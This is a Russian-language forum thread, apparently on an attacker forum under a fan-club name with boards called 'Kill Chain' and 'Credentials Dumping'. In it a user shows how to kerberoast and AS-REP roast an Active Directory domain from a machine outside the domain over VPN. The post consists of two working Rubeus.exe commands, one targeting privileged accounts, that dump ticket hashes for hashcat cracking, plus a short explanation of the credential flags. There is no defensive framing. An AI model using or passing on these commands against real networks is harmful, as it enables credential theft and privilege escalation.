@@ -1,0 +1,64 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Credentials Dumping »
+    Проводим атаку kerberoasting через впн с НЕ доменной тачки, имея впн креды
+
+Проводим атаку kerberoasting через впн с НЕ доменной тачки, имея впн креды
+cybercat · 1 · 35
+« предыдущая тема следующая тема »
+
+Страницы: 1
+cybercat
+
+    Users
+    Member
+    *
+        3
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Марта 16, 2021, 07:28:30 pm
+Записан
+
+
+```
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+```
+как видите мы делаем то же самое что и в обычной атаке, просто добавляем 3 новых атрибута:
+/dc: - указываем контроллер домена
+/creduser: - логин доменного пользака от которого мы запускаемся
+/credpassword: - пароль доменного пользака от которого мы запускаемся
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Credentials Dumping »
+    Проводим атаку kerberoasting через впн с НЕ доменной тачки, имея впн креды
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
